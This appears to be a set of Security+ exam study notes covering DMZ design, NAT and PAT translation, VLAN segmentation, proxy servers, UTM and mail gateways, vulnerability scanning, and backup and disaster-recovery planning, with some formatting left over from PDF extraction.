Stores everything in a single nested document, often in XML format (document-based) Can handle large volumes of structured, semi-structured, and unstructured data Horizontal: Add more servers MongoDB, CouchDB, and others
No, but susceptible to similar injection-type attacks
SQL database
Relational Predefined
Individual records are stored as rows in tables (table- based)
Widely supported and easy to configure for structured data
Vertical: Beef up the server
Oracle, Microsoft, MySQL, and others
Yes
Increasingly, organizations have to store extremely large amounts of data, often many tera- bytes. This is sometimes referred to simply as Big Data. This data normally cannot fit on a single server, and it is instead stored on a storage area network (SAN), which is discussed next. One of the issues with Big Data is that it reaches a size where it becomes difficult to search, store, share, back up, and truly manage.
Implementing a Secure Network
There are several elements of a secure network, including the implementation of different zones and topologies, segmenting and isolating some elements, and using various network devices. This section covers these topics in more depth.
     Zones and Topologies
Most networks will not connect directly to the Internet.
it’s common to divide the network into different zones, using different topologies.
Intranet: an internal network. People use the intranet to communicate and share content with each other. While it’s common for an intranet to include web servers, this isn’t a requirement.
Extranet: part of a network that can be accessed by authorized entities from outside of the network.
  - example, authorized business partners,customers,vendors...
The network perimeter provides a boundary between the intranet and the Internet.
Boundary protection: multiple methods to protect the network perimeter. DMZ The demilitarized zone
a buffered zone between a private network and the Internet.
Attackers seek out servers on the Internet, the DMZ provides a layer of protection for these Internet-facing servers, while also allowing clients to connect to them.
DMZ provides a layer of protection for Intranet.
The DMZ: the area between the two firewalls, hosts Internet-facing servers. Many DMZs have two firewalls, creating a buffer zone between the Internet and
the internal network.
one firewall separates the DMZ from the Internet.
2nd firewall separates the DMZ from the internal network.
Each firewall includes detailed rules designed to filter traffic and protect both the internal network and the public servers.
DMZ provides access to the services hosted in the DMZ, while segmenting access to the internal network.  Example:
FW1: allow traffic to the servers in the DMZ, but block unsolicited traffic to
FW2.
The mail server would send and receive email to other email servers on the
Internet through port 25 of FW1, and also send and receive email to
internal clients through port 25 on FW2.
The web server hosts web pages to any Internet users through ports 80 and
443 on FW1, but FW2 blocks incoming traffic using these ports.
The Certificate Authority (CA) server validates certificates for Internet clients
by answering through FW1. Intranet:
database server. The web server may use this to create web pages. FW2 allows traffic between the web server (and only the web server) and the database server on port 1433. block all other Internet traffic to the database server.
It’s also possible for the web server and the database server to be part of an extranet.
  - e x a m p l e : web server hosts a site for business partners to place orders. The web server would first authenticate them before granting full access. After users log on, the web site connects to the back-end database server, allowing them to browse the inventory and place orders. Because this site is only for authorized business partners, it is an extranet. The DMZ can host any Internet-facing server, not just those shown in the figure.
Examples:
FTP servers: uploading and downloading files and virtual private network
(VPN) servers used for providing remote access.
NAT and PAT
Network Address Translation (NAT)
- Protocol translates public IP addresses to private IP addresses and private addresses back to public.
- often see NAT enabled on an Internet-facing firewall.
- commonly used form of NAT: network address and Port Address Translation
(PAT).
  - Example: NAT, the router at home.
- This public IP address represents the point of contact with the Internet
for the entire LAN: machines on the network have private IP addresses that are only accessible from within the network.
benefits of NAT:
- Simplify network: Public IP don’t need to be purchased for all clients.
  - A home or company network include multiple computers that can
access the Internet through one router running NAT.
  - Larger companies requiring more bandwidth may use more than one public IP address.
  - For computers, printers, and other network devices in home networks: ▪


##   - we do not buy new IP and setup the new addresses on the Internet.   - NAT allows all machines on a LAN share a single public IP
address.
- NAT hides internal computers from the Internet.
  - Computers with private IP addresses are isolated and hidden from the Internet. NAT provides a layer of protection to these private computers because they aren’t as easy to attack and exploit from the Internet.
- significantly delayed the inevitable exhaustion of the IPv4.
  - there is a lot of address capacity for NAT, a lots private IP
addresses that are allowed to use but cannot be used on the (public) Internet.
The private IP address:
10.0.0.0/8
172.16.0.0/12 - 172.31.0.0/12 192.168.0.0/16
NAT router:
the gateway between private IP and the public Internet,
responsible for managing both inbound and outbound Internet traffic.
     ▪


##  Many firewalls (like routers) implement network address translation (NAT) at the border, and NAT can be implemented in many different ways.
Basic NAT, a one-to-one mapping
  - each internal private IP address is mapped to a unique public
address.
  - As the message leaves the network, the packet is changed to use the public IP, and when it is answered and routed back
 ▪


## through the Internet to the firewall (or external router), NAT matches it back to the single corresponding internal address and sends it along its way.
  - Example
  - packet leaving 172.16.1.72 would be changed to
200.57.8.212 for its journey across the Internet.
  - the rest of the world will see IP addresses in your public range, the true senders are internal and use an address from any of the private network classes (192.168.0.0, 172.16– 31.0.0, or 10.0.0.0).
  - In the real world, though, most organizations and individuals don’t implement a one-to-one mapping; it’s simply too expensive.
A more common method: NAT overload (port address translation PAT)
  - the port numbers (and other goodies) unique to each web conversation to allow many internal addresses to use one external address.
  - Example:
  - check wireless router. How many devices do you have
connected to it?
  - Each one has its own private IP address assigned (probably in the 192.168.1.1–254 range), which we all know can’t be routed to or from the Internet.
  - you did not purchase a public IP address range from your provider, right?
  - Open the configuration for your router and check the public- 2,850

▪
facing IP address. I’ll bet you’ll find you’ve been NAT-ing like a pro all along.
How NAT Works
NAT router maintains a lookup table
contains entries: (private source IP, private source port, destination IP,
public source port)
To translate between private and public IP addresses,
NAT router dynamically rewrites the headers of all inbound and outbound TCP and UDP packets:
machine on the internal network send packet to an external IP address NAT router creates a new entry in the lookup table:
  - the source machine’s private IP
  - the internal source port of the transmitted packet.
Next, it rewrites the source IP address to be the NAT device’s public IP, and
rewrites the IP header’s source port field to contain a newly opened port.
This public port and the destination IP address are recorded alongside the private source IP and private internal port in the NAT device’s lookup table.
The NAT device also adjusts any checksums contained in the packet, including those used by IP and TCP/UDP, to reflect the changes made.
The packet is then forwarded to its destination. On receiving a response,
the NAT router checks its lookup table for any entries:
  - whose public source port corresponds to the destination port of the
 inbound packet
  - whose destination IP address (recorded because of the previous outbound packet) corresponds to the source IP of the inbound packet.
Finally, the NAT router rewrites the IP headers of the inbound packet according to the lookup table, so that the packet is forwarded to the correct private IP address and private port.
This process effectively manages outbound traffic, but places several restrictions on the possibilities for inbound traffic.
An external machine has no way of initiating a connection with a machine on the private network, cause the internal machine does not have a publicly accessible IP address.
This can actually be seen as a security feature, since no inbound traffic from the Internet can reach the internal network. Thus, in many ways, NAT devices can function as firewalls, blocking risky contact from the external Internet.
Network Address Translation is not a perfect solution.
it violates the ideal goal of end-to-end connectivity for machines on the Internet by not allowing direct communication between internal and external parties.
may cause problems when using several protocols, especially those using something other than TCP or UDP as a transport-layer protocol.
not compatible with IPsec. You can use IPsec to create VPN tunnels and use it with L2TP to encrypt VPN traffic.Although there are ways of getting around NAT’s incompatibility with IPsec, if your design includes IPsec going through NAT, you’ll need to look at it closely. NAT can be either static NAT or dynamic NAT:
Static NAT: uses a single public IP address in a one-to-one mapping.
  - maps a private IP address with a single public IP address. Dynamic NAT: uses multiple public IP addresses in a one-to-many mapping.
  - Dynamic NAT decides which public IP address to use based on load
  - Example:
  - several users are connected to the Internet on one public IP address, NAT maps the next request to a less-used public IP address.
Port address translation (PAT)
- NAT drawback:
◦ one-to-one mapping of inside local addresses to inside global addresses
▸ need as many publicly routable IP addresses as it had internal devices needing IP addresses.
◦ does not scale well, usually service provider only provide a single or small block of IP addresses.
•
◦
◦
But many routers support Port Address Translation (PAT):
PAT leverages port numbers to track separate communication flows.
allows multiple inside local addresses to share a single inside global address
(publicly routable IP):
▸ when client sends an IP packet.
- (packet have: source and destination IP address, source and destination port
number...)
▸ each inside local address was translated to its single inside global address
(shared among all the devices inside a network).
▸ The different communication flows are kept separate in router R1’s NAT
translation table by considering port numbers.
▸ Example:
- client 1 10.1.1.1 sends packet to web server 192.168.1.1. ◦ client’s ephemeral port number is 1025 (source port selected, greater than 1023).
•
◦
•
◦
client 2 10.1.1.2 sends a packet to web server. port number of 1050
Router R1translated:
inside global address = outside local address = 172.16.1.100
inside local address 10.1.1.1 (port number 1025) to 172.16.1.100 (port number 2025)
◦ inside local address 10.1.1.2 (port number 1050) to 172.16.1.100 (port number 2050)
◦ All inside local addresses translated into the same inside global address of 172.16.1.100.
◦ when the web server sends packets back to client 1 and client 2, packets are destined for the same IP address (172.16.1.100).
◦ However, when R1 receives those packets, it knows to forward packet based on the destination port number.
◦ Example:
▸ packet with a destination IP address of 172.16.1.100 and a destination port number of 2050.
▸ Translate the destination IP address to 10.1.1.2 with a port number of 1050 to client 2.
Network Separation
use different components to provide network separation. segregation, segmentation, and isolation.
Segregation provides basic separation,
segmentation refers to putting traffic on different segments, isolation indicates the systems are completely separate.
◦ Physical Isolation, Airgaps
Physical isolation: ensures a network isn’t connected to any other network.
Example:
consider supervisory control and data acquisition (SCADA) systems.
typically industrial control systems within large facilities such as power plants or water treatment facilities.
While SCADA systems operate within their own network, it’s common to ensure that they are isolated from any other network.
If attacker can’t reach it from the Internet, more difficult to attack it.
However, if the system is connected to the internal network, it’s possible to gain access to internal computers, and then access any resource on the internal network.
An airgap: metaphor for physical isolation
a gap of air between an isolated system and other systems. When considered
literally, an air-gapped system is not connected to any other systems.
  - Example
  - many organizations use both classified (red) and unclassified (black) networks.
  - Strict rules ensure that these two systems are not connected to each other.
  - Like any cable from a red network must be physically separated from black network cables.
Logical Separation and Segmentation
Routers and firewalls: provide a basic level of separation and segmentation.
Routers: segment traffic between networks using rules within ACLs.
Administrators use subnetting to divide larger IP address ranges into smaller ranges.
They then implement rules within ACLs to allow or block traffic.
Firewalls: separate network traffic using basic packet-filtering rules and can also use more sophisticated methods to block undesirable traffic.
It’s also possible to segment traffic between logical groups of users or computers with a virtual local area network (VLAN). This provides logical separation.
Layer 2 vs Layer 3 Switch
Layer 2 switch:
A traditional switch
operates on Layer 2 of the Open Systems Interconnection (OSI) model,
uses the destination MAC address within packets to determine the destination port.
forwards broadcast traffic to all ports on the switch.
Layer 3 switch:
Layer 3 Router: forward traffic based on the destination IP address within a
packet, block broadcast traffic.
Layer 3 switch:
  - mimics the behavior of a router
  - allows network administrators to create virtual local area networks
(VLANs).
  - As Layer 3 switch forwards traffic based on the destination IP not MAC address, it is not susceptible to ARP-based attacks.
Isolating Traffic with a VLAN
A virtual local area network (VLAN) uses a switch to group several different computers into a virtual network. You can group the computers together based on departments, job function, or any other administrative need. This provides security because you’re able to isolate the traffic between the computers in the VLAN.
Normally, a router would group different computers onto different subnets, based on physical locations. All the computers in a routed segment are typically located in the same physical location, such as on a specific floor or wing of a building. computers based on logical needs rather than physical location. Additionally, administrators can easily reconfigure the switch to add or subtract computers from any VLAN if the need arises.
Example:
a group of users who normally work in separate departments may begin work on a project that requires them to be on the same subnet.
  - You can configure a Layer 3 switch to logically group these workers together, even if the computers are physically located differently.
  - When the project is over, you can simply reconfigure the switch to return the network to its original configuration.
VoIP streaming traffic can consume quite a bit of bandwidth.
  - One way to increase the availability and reliability of systems using this voice traffic is to put them on a dedicated VLAN.
  - Other systems transferring traditional data traffic can be placed on a separate VLAN.
  - This separates the voice and data traffic within the VLAN. Similarly, you can use a single switch with multiple VLANs to separate user
traffic.
Example:
to separate the traffic between theHR department and the IT department,
  - use a single switch with two VLANs.
  - The VLANs logically separate all the computers even if the computers
are located close ly.
Proxy Servers 代理服务器
clients are configured to forward their packets to a proxy server.
- proxy server receives the client’s request,
- the client’s server sends the request out to the Internet. (on behalf of that
client)
- When a reply is received from the Internet, the proxy server forwards the response on to the client.
(forward) Proxy servers: to forward requests for services (like HTTP or HTTPS) from clients.
- improve performance by caching content
- some proxy servers can restrict users’ access to inappropriate web sites by
filtering content.
- located on the edge of the network bordering the Internet and the intranet.
 A proxy server would not use an ACL, although it would use ports 80 and
443 for Hypertext Transfer Protocol (HTTP) and HTTP Secure (HTTPS), respectively.
 Administrators configure internal clients to use the proxy server for specific protocols.
- The proxy accepts their requests, retrieves the content from the Internet, and then returns the data to the client.
- Most proxy servers only act as a proxy for HTTP and HTTPS.
  - can also proxy other Internet protocols: like FTP.
Benefit:
- Security
  - all requests out to Internet are sourced from the proxy server.
  - hidden the IP addresses of network devices inside the trusted network
from the Internet.
- bandwidth savings: many proxy servers perform content caching.
  - without a proxy server:   - one time for each client visiting the website.
  - multiple clients, multiple times the same graphics from the
home page of the website would be downloaded
  - with a proxy server:
  - the first client navigates to a website
  - the web server returns its content,
  - the proxy server:
  - forwards this content to the client requesting the web page
  - also store a copy of the content on its hard drive.
  - when a subsequent client points its web browser to the same
website, after the proxy server determines that the page hasn’t changed, the proxy server can locally serve up the content to the client
  - don't consume again Internet bandwidth to download all from web.
- content filtering.
  - Content filtering restricts clients from accessing certain URLs.
(nontransparent proxy servers)
  - subscription lists.
Why attackers use proxy servers?
- To hide the source IP address
Caching Content for Performance
The proxy server increases the performance of Internet requests by caching each result received from the Internet.
- Any data that is in the proxy server’s cache doesn’t need to be retrieved from the Internet again to fulfill another client’s request.
- Cache: “temporary storage.”
- Cache could be a dedicated area of RAM, or, in some situations, an area on a
high-performance disk subsystem.
Example:
- Lisa retrieves a web page from GetCertifiedGetAhead.com
 - the proxy server would store the result in cache.
- If Homer later requests the same page,
- the proxy server retrieves the page from cache and sends it to Homer.
- This reduces the amount of Internet bandwidth used for web browsing, the
page doesn’t need to be retrieved again.
Transparent Proxy vs Nontransparent Proxy
Transparent proxy: accept and forward requests without modifying them.
- It is the simplest to set up and use and it provides caching.
Nontransparent proxy server: can modify or filter requests.
Organizations often use nontransparent proxy servers
- to restrict what users can access with the use of URL filters.
  - URL filter: examines the requested URL, allow the request / deny the request.
Many third-party companies sell subscription lists for URL filtering.
- These sites scour the Internet for web sites, categorize the sites based on
what companies typically want to block.
- Categories may include: anonymizers, pornography, gambling, web-based
email, and warez sites.
  - Anonymizers: sites that give the illusion of privacy on the Internet.
  - Employees sometimes try to use anonymizers to bypass proxy servers, but a proxy server usually detects, blocks, and logs these attempts.
  - Web-based email bypasses the security controls on internal email servers, so many organizations block them.
  - Warez sites 盗版软件: often host pirated software, movies, MP3 files, and hacking tools.
The subscription list can be loaded into the proxy server
- whenever a user attempts to access a site on the URL filter block list,
- the proxy blocks the request.
- Often, the proxy server presents users with a warning page when they try to
access a restricted page.
  - remind users of a corporate acceptable usage policy   - reminders that the proxy server is monitoring their online activity. - Proxy servers include logs: record each site visited by users.
  - helpful to identify frequently visited sites
  - to monitor user web browsing activities.
Reverse Proxy
- accepts requests from the Internet, typically for a single web server.
- It appears to clients as a web server, but is forwarding the requests to the web
server and serving the pages returned by the web server.
- reverse proxy server is configured to protect a web server.
- Benifit: This configuration: allows the web server to be located in the private
network behind a second firewall.
Example:
- Bart wants to access http://gcgapremium.com.
- He types the URL into his browser and it connects to the reverse proxy
server.
- The reverse proxy server connects to the web server and retrieves the web
page.
- It then sends the web page to Bart.
- A reverse proxy server caches the web pages just as a forward proxy server
does, so it can improve the overall web site performance.
The reverse proxy server can be used for a single web server or a web farm of multiple servers.
- When used with a web farm, it can act as a load balancer.
- You would place the load balancer in the DMZ to accept the requests and it
 then forwards the requests to different servers in the web farm using a load- balancing algorithm.
Application Proxy
- used for specific applications.
- It accepts requests, forwards the requests to the appropriate server, and then
sends the response to the original requestor.
  - Example:
  - forward proxy used for HTTP: a basic application proxy.
- However, most application proxies are multipurpose proxy servers supporting multiple protocols: like HTTP and HTTPS.
Example
- book from Amazon ships via United Parcel Service (UPS).
- Check the status of the shipment.
- TheAmazonwebsitesendsaqueryto aUPSapplicationproxyforthestatus.
- The UPS application proxy provides the status in a response.
  - Internet applications exchange data this way using application programming interfaces (APIs).
- UPS specifies the format of the request in an API.
- If the application proxy receives a properly formatted and valid request, it
provides an answer.
Unified ThreatManagement
a single solution combines multiple security controls. The overall goal of UTMs:
  - to provide better security,
  - while simplifying management requirements.
  - reduce the workload of administrators without sacrificing security.
As IT-based threats first began appearing, security experts created various solutions to deal with each of them
malware infect computers - antivirus software
attacking networks - firewalls
control whatsitesuserscanvisit - proxieswithURLfilters. So, UTM security appliances have become quite popular.
UTM security appliances
combine the features of multiple security solutions into a single appliance Example:
a UTM security appliance might include a firewall, antivirus protection, anti-
spam protection, URL filtering, and content filtering.
In general, a computer appliance is a hardware device designed to provide a specific solution.
Example:
spam appliances: scan all incoming email and strip off spam.
don’t have to know the details of how a toaster works to make toast. don’t have
to know the details of how a computer appliance operates to use it.
UTM security appliances include multiple capabilities, including: URL filtering: perform the same job as a proxy server.
  - block access to sites based on the URL.
  - It’s common to subscribe to a service and select categories to block
access to groups of sites.
  - Administrators can also configure URL filters manually for specific
web sites.
  - Example, if an administrator realizes that users are routinely
connecting to a peer-to-peer (P2P) file sharing site, the administrator
can add the URL to the filter, and block access to that site.
Malware inspection:
  - Malware often comes into a network via spam, or malicious web pages.
  - screens incoming data for known malware and blocks it.
  - Organizations often scan for malware at email servers and at
individual systems as part of a layered security or defense-in-depth
solution.
Content inspection:
  - a combination of different content filters.
  - It monitors incoming data streams, block any malicious content.
  - It can include a spam filter to inspect incoming email, reject spam.
  - It can also block specific types of transmissions, like streaming audio,
video, specific types of files like Zip.
DDoS mitigator: detect DDoS attacks and block them. The output of the UTM varies depending on the device and what it sees. Example: detects malware: raise an alert and send it to administrators.
A common security issue with UTMs:
misconfigured contentfilter.
Example:
spam filter is misconfigured: block valid mail or allow too much spam into the
network. Administrators adjust the sensitivity of the spam filter to meet the
needs of the organization.
unacceptable to block emails from customers or potential customers, need adjust
the sensitivity allowing more spam into the network to meet this need.
place UTM appliances at network border, between Internet and intranet.
allows it to intercept and analyze all traffic to and from the Internet.
However, the placement is dependent on how the UTM appliance is being used. Example:
if it is being used as a proxy server, it can be placed within the DMZ. Administrators would configure the clients to use the UTM appliance for proxy servers ensuring that all relevant traffic goes through it.
Media Gateway
a device converts data from the format used on one network to the format used on another network.
  - Example:
  - VoIP gateway: converts telephony traffic between traditional phone
lines and IP-based network
  - Users can receive phone calls by VoIP equipment, the gateway
translate the traffic and transmit the calls over a traditional phone line. Mail Gateways
a server logically placed between an email server and the Internet.
examine and analyze all traffic and outgoing email
block unsolicited email with a spam filter.
Many include data loss prevention (DLP) and encryption capabilities. attempts to reduce risks associated with email.   - Many vendors sell appliances that perform all the desired services of a mail gateway.
  - many vendors include a mail gateway within a UTM appliance. another security feature of UTM appliance.
Administrators locate it between the email server and the Internet and configure it for their purposes.
  - All mail goes to the gateway before it goes to the email server.
spam filter: filters out spam from incoming email
Example:
spam can attach malware or include link of malicious web site.
Mail gateways often include data loss prevention (DLP) capabilities. DLP examine outgoing email
Look confidential / sensitive information and block them. Example:
secret project with a codeword of “DOH.”
documents associated with project have the keyword.
The mail gateway includes this keyword in its searches and when it detects the
keyword within an email or an attachment, it blocks the email. Administrators can configure the gateway to notify security personnel, sender
user, or both when it blocks an email.
Many mail gateways also support encryption.
encrypt outgoing email to ensure confidentiality for the data-in-transit, or only encrypt certain data based on policies.
  - Example:
  - if an organization is working on a project with another organization,
administrators can configure the gateway to encrypt all traffic sent to
the other organization.
The method of encryption varies from vendor to vendor.
  - Example,
  - certificate-based encryption
  - password-based encryption.... Prevent switching loops. You do this by implementing STP or RSTP on switches.
Block flood attacks. Flood guards block MAC flood attacks.
Prevent unauthorized users from connecting to unused ports. Port security methods, such as disabling unused ports, prevent these unauthorized connections. Provide increased segmentation of user computers. VLANs provide increasedsegmentation.TheyareimplementedonLayer3 switches.
Simple Network Management Protocol version 3 (SNMPv3) monitors and manages network devices, such as routers or switches. This includes using SNMPv3 to modify the configuration of the devices or have network devices report status back to a central network management system. SNMPv3 agents installed on devices send information to an SNMP manager via notifications known as traps (sometimes called device traps).
The first version of SNMP had vulnerabilities, such as passing
passwords across the network in cleartext. SNMPv2 and SNMPv3 are much more secure and they provide strong authentication mechanisms. SNMPv3 uses UDP port 161. It sends traps (error messages and notifications) on UDP port 162.
The following bullets identify some use cases that you can implement with
routers:
Prevent IPaddress spoofing. Antispoofing methods prevent IP address spoofing. These are implemented with rules in ACLs.
Provide secure management of routers. SNMPv3 is used to securely manage network devices such as routers.
Chapter 3 Exam Topic Review
When preparing for the exam, make sure you understand these key concepts covered in this chapter.
 Reviewing Basic Networking Concepts
A use case typically describes an organizational goal and administrators enable specific protocols to meet organizational goals.
Protocols used for voice and video include Real-time Transport Protocol (RTP) and Secure Real-time Transport Protocol (SRTP). SRTP provides encryption, message authentication, and integrity for RTP.
File Transfer Protocol (FTP) is commonly used to transfer files over networks, but FTP does not encrypt the transmission.
Several encryption protocols encrypt data-in-transit to protect its confidentiality. They include File Transfer Protocol Secure (FTPS), Secure File Transfer Protocol (SFTP), Secure Shell (SSH), Secure Sockets Layer (SSL), and Transport Layer Security (TLS).
SMTP sends email using TCP port 25. POP3 receives email using TCP port 110. IMAP4 uses TCP port 143. Secure POP uses TLS on port 995 (legacy) or with STARTTLS on port
110. Secure IMAP uses TLS on port 993 (legacy) or with STARTTLS on
port 143.
HTTP uses port 80 for web traffic. HTTPS encrypts HTTP traffic in transit and uses port 443.
Directory services solutions implement Kerberos as the authentication protocol. They also use Lightweight Directory Access Protocol (LDAP) over TCP port 389 and LDAP Secure (LDAPS) over TCP port 636.
Administrators commonly connect to remote systems using SSH instead of Telnet because SSH encrypts the connection. Administrators also use Remote Desktop Protocol (RDP) to connect to remote systems using TCP port 3389.
The Network Time Protocol (NTP) provides time synchronization services.
Domain Name System (DNS) provides domain name resolution. DNS zones include A records for IPv4 addresses and AAAA records for IPv6 addresses. Zone data is updated with zone transfers and secure zone transfers help prevent unauthorized access to zone data. DNS uses TCP port 53 for zone transfers and UDP port 53 for DNS client queries.
Domain Name System Security Extensions (DNSSEC) provides validation for DNS responses and helps prevent DNS poisoning attacks.
Two command-line tools used to query DNS are nslookup and dig. Both support the axfr switch, allowing them to download all zone data from a DNS server, unless the DNS server blocks the attempt. Understanding Basic Network Devices
- Switches are used for network connectivity and they map media access control (MAC) addresses to physical ports.
- Port security limits access to switch ports. It includes limiting the number of MAC addresses per port and disabling unused ports. You can also manually map each port to a specific MAC address or group of addresses.
- An aggregation switch connects multiple switches together in a network.
- Routers connect networks and direct traffic based on the destination IP address. Routers (and firewalls) use rules within access control lists (ACLs)
to allow or block traffic.
- Implicit deny indicates that unless something is explicitly allowed, it is
denied. It is the last rule in an ACL.
- Host-based firewalls (sometimes called application-based) filter traffic in
and out of individual hosts. Some Linux systems use iptables or xtables for
firewall capabilities.
- Network-based firewalls filter traffic in and out of a network. They are
placed on the border of the network, such as between the Internet and an
internal network.
- A stateless firewall controls traffic between networks using rules within an
ACL. The ACL can block traffic based on ports, IP addresses, subnets, and some protocols. Stateful firewalls filter traffic based on the state of a packet within a session.
- A web application firewall (WAF) protects a web server against web application attacks. It is typically placed in the demilitarized zone (DMZ) and will alert administrators of suspicious events.
Implementing a Secure Network
A DMZ provides a layer of protection for servers that are accessible from the Internet.
An intranet is an internal network. People use the intranet to communicate and share content with each other. An extranet is part of a network that can be accessed by authorized entities from outside of the network.
NAT translates public IP addresses to private IP addresses, private back to public, and hides IP addresses on the internal network from users on the Internet. Networks use various methods to provide network segregation, segmentation, and isolation.
An airgap is a metaphor for physical isolation, indicating a system or network is completely isolated from another system or network. RoutersprovidelogicalseparationandsegmentationusingACLsto control traffic. Forward proxy servers forward requests for services from a client. It can cache content and record users’ Internet activity. A transparent proxy accepts and forwards requests without modifying them. A nontransparent proxy can modify or filter requests, such as filtering traffic based on destination URLs.
Reverse proxy servers accept traffic from the Internet and forward it to one or more internal web servers. The reverse proxy server is placed in the DMZ and the web servers can be in the internal network.
A unified threat management (UTM) security appliance includes multiple layers of protection, such as URL filters, content inspection, malware inspection, and a distributed denial-of-service (DDoS) mitigator. UTMs typically raise alerts and send them to administrators to interpret.
Mail gateways are logically placed between an email server and the Internet. They examine and analyze all traffic and can block unsolicited email with a spam filter. Many include data loss prevention (DLP) and encryption capabilities.
Summarizing Routing and Switching Use Cases
Loop protection protects against switching loop problems, such as when a user
connects two switch ports together with a cable. Spanning Tree
Protocols protect against switching loops. Flood guards prevent MAC flood attacks on switches.
VLANs can logically separate computers or logically group computers regardless of their physical location. You create them with Layer 3 switches.
Routers use rules within ACLs as an antispoofing method. Border firewalls block all traffic coming from private IP addresses.
SNMPv3 is used to monitor and configure network devices and uses notification messages known as traps. It uses strong authentication mechanisms and is preferred over earlier versions. SNMP uses UDP ports 161 and 162.
Online References
Remember, the online content includes some extras, such as labs, performance- based question examples, and more. Check it out at http://gcgapremium.com/501- extras.
 S+4th: ch12 Disaster Recovery and Incident Response
Vulnerability Scanning
Vulnerability scanning:
Vulnerability scanning: first identify specific vulnerabilities in your network,
  - Then penetration testers will start with this procedure, identify likely targets to attack. attempt to exploit these vulnerabilities.
  - Vulnerability scanner: find open ports and missing patches,
The key element of a vulnerability scan: identify vulnerabilities identifying common misconfigurations
identifying a lack of security controls.
Then attempt to exploit them.
the most egregious vulnerability is any aspect of your system where vulnerability scanning reveals a lack of security controls.
Some of the more common vulnerabilities involve misconfiguration.
In fact, popular vulnerability scanners, such as Nessus (www.tenable.com/products/ nessus), will help identify common misconfigurations.
Credentialed vs. Noncredentialed
Vulnerability scanning: credentialed or noncredentialed manner.
   - configuration compliance scanner: confirm software/patches/ overall configurations. credentialed vulnerability scan:
  - uses actual network credentials to connect to systems and scan for vulnerabilities.
  - uses its running service's access level to better assess vulnerabilities across multiple assets within an organization
Uncredentialed vulnerability scan:
  - inactive local accounts.
benefits of credentialed 信任 scanning:
Not disrupte operations or consume too many resources
  - scan is performed with credentials
  - operations are executed on the host itself rather than across the network.
  - Everything from operating system identification to port scanning is done by running commands on the host and then sending the results of those commands back to the Nessus server.
  - This allows Nessus to consume far less system and network resources than performing a traditional network scan that probes ports and services remotely.
Definitive List of Missing Patches
  - Nessus: query the local host to see if a patch for a given vulnerability has
been applied.
  - Not by service remotely to find vulnerability
  - This type of query is more accurate and safer than remote check.
   - Level of insight and internal perspective is what credentialed scanning lends to a security assessment.
   - Scanner provide visibility over the patch posture of all company’s
clients. Client-Side Software Vulnerabilities Are Uncovered
  - By looking at the software installed and its version, Nessus will find client-side software vulnerabilities that are otherwise missed in a traditional network-based audit.
Several Other “Vulnerabilities”:
  - Nessus can read password policies, obtain a list of USB devices, check antivirus software configurations, and even enumerate Bluetooth devices attached to scanned hosts.
Whether you use credentialed or noncredentialed vulnerability scanning, be prepared for false positives.
the scan mistakenly identifies something as a vulnerability when it is not.
No software program is perfect, any vulnerability scanner will yield some occasional false positives.
Business continuity: primarily concerned with the processes, policies, and methods that an organization follows to minimize the impact of a system failure, network failure, or the failure of any key component needed for operation—that is, essentially whatever it takes to ensure that the business continues and that the show does indeed go on.
Business Continuity Planning (BCP):
  - the process of implementing policies, controls, and procedures to counteract the effects of losses, outages, or failures of critical business processes.
  - a management tool that ensures that critical business functions can be performed when normal business operations are disrupted and alternate business practices must be employed.
  - For each critical business task, there should be a minimum of one alternative business process identified during the crafting of a continuity plan.   - Those alternate business practices should be documented in detail that someone unfamiliar with them could perform them with minimal training.
  - 2 key components of BCP in order for BCP to be effective:
  - business impact analysis (BIA): evaluating the processes
  - risk assessment: evaluating the risk or likelihood of a loss.
Critical Business Functions (CBFs):
  - processes or systems that must be made operational immediately when an
outage occurs.
  - The business can’t function without them, and many are information- intensive and require access to both technology and data.
Types of Storage Mechanisms
restore information from backup copies for reasons like: Accidental deletion, Application errors, Natural disasters, Physical attacks, Server failure, Virus infection, Workstation failure.
Several types of storage mechanisms are available for data storage. These include the following:
Working Copies / shadow copies:
  - partial or full backups that are kept at the computer center for immediate
recovery purposes.
  - usually updated on a frequent basis and are generally the most recent
backups that have been made.
  - Not serve as long-term copies. In busy environment may be created every few
hours.
  - journaled file system (JFS):   - Many filesystems used on servers include journaling
  - includes a log file of all changes and transactions that have
occurred within a set period of time (like the last few hours).
  - If a crash occurs, OS can check the log files to see which transactions have been committed and which ones have not.
  - This technology works well, allows unsaved data to be written after recovery, restored to pre-crash condition.
Onsite Storage:
  - a location on the site of the computer center that is used to store information locally.
  - Onsite storage containers: allow computer cartridges and tapes or backup media to be stored in a reasonably protected environment in the building.
  - designed and rated for fire, moisture, and pressure resistance.
  - These containers aren’t fireproof in most cases, but they are indeed
fire rated.
  - Fireproof: withstand damage of fire or temperature.
  - Fire ratings: can protect its contents for a specific amount of time in a given situation.
  - If depend entirely on onsite storage, make sure:
  - the containers can withstand the worst-case environmental
catastrophes.
  - they are in locations where can easily find and access them after the disaster (like near exterior walls, on the ground floor...).
  - General-purpose storage safes aren’t usually suitable for storing electronic media.
  - paper does not catch fire until 451° Fahrenheit,
  - electronic media would typically be ruined well before paper documents are destroyed in a fire. Offsite storage:
a location away from the computer center where paper copies and backup media are
kept.
remote office, a nuclear-hardened, high-security storage facility.
The storage facility should be bonded, insured, and inspected on a regular basis to ensure that all storage procedures are being followed.
Determining which storage mechanism to use: the needs of the organization,
the availability of storage facilities
the available budget.
amount of space required
the frequency of access needed to the stored information.
don’t overlook the need for security during transportation as well.
Disaster-Recovery Plan
helps an organization respond effectively when a disaster occurs. Disasters: system / network / infrastructure / natural disaster.
The primary emphasis: reestablishing services and minimizing losses.
A major component of a disaster-recovery plan involves the access and storage of infor- mation. Your backup plan for data is an integral part of this process.
The following sections address backup plan issues and backup types. Backup Plan Issues
backup plan: identifies which information, how it will be stored, what duration. Database Systems
Most modern database systems provide the ability to back up data or certain sections of the database globally without difficulty. Larger-scale database systems also provide transaction auditing and data-recovery capabilities.
Example:
  - you can configure your database to record in a separate file each addition, update, deletion, or change of information that occurs. These transaction or audit files can be stored directly on any type of archival media (magnetic tape cartridges, solid state drives...)
  - In the event of a system outage or data loss, the audit file can be used to roll back the database and update it to the last transactions made.
the auditing process:
  - the audit file is directly written to a digital audio tape (DAT) that is used
to store a record of changes.
  - If an outage occurs, the audit or transaction files can be rolled forward to bring the database back to its most current state.
  - This recovery process brings the database current to within the last few transactions. Although it doesn’t ensure that all of the transactions that were in process will be recovered, it will reduce potential losses to the few that were in process when the system failed.  ⁃
Most database systems contain large files that have only a relatively few records updated in relation to the number of records stored.
A large customer database may store millions of records; however, only a few hundred may be undergoing modification at any given time.
User Files
Word processing documents, spreadsheets, and other user files are extremely valuable to an organization.
